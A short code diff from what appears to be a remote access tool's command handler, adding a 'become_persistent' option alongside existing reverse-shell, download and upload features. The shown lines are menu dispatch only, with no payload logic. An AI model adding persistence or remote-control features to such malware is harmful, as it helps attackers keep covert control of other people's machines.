@@ -1,5 +1,6 @@
 from core.utils import display_msg
 from core.features.shell import run_reverse_shell
+from core.features.persistence import become_persistent
 from core.features.filetransfer import download, upload
 import time
 
@@ -17,6 +18,8 @@ def connection_handler(client):
             download(client)
         elif option == "3":
             upload(client)
+        elif option =="4":
+            become_persistent(client)
 
         elif option == "exit" or option == "99" or option == "stop" or option == "quit":
             display_msg("Exiting", "y")
